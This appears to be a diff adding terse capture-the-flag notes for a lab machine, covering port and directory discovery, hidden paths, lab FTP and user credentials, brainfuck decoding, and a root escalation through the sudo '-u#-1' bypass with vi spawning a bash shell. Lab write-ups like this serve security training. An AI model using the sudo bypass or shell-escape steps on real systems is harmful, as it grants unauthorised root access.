@@ -1,0 +1,48 @@
+IP -> 10.10.152.87
+
+Open ports -> 21, 22, 80
+
+Hidden Dirs -> assests
+
+Hidden path in style.css -> /sup3r_s3cr3t_fl4g.php
+
+Message -> hint is in video page
+
+Hidden path -> after interception : WExYY2Cv-qU/
+
+File -> Hot_Babe.png
+
+strings dump -> ftuser , username for ftp and list of password
+
+
+user name and password -> ftpuser : 5iez1wGXKfPKQ
+
+credentials found -> user : eli
+
+encryption -> brainfuck
+
+Decrypted password : 
+			User: eli
+			Password: DSpDiM1wAEwid
+
+Find secret location -> locate or whreis
+
+Password found:
+			User: Gwendoline
+			Password: MniVCQVhQHUNI
+
+
+Search sudo vulnerability cheat sheets
+
+We found a vunerability with !root entry in sudoer file.
+
+ex. sudo -u#-1 id -u
+
+transforming it to our vi example
+
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+:! /bin/bash for root shell
+
+
+
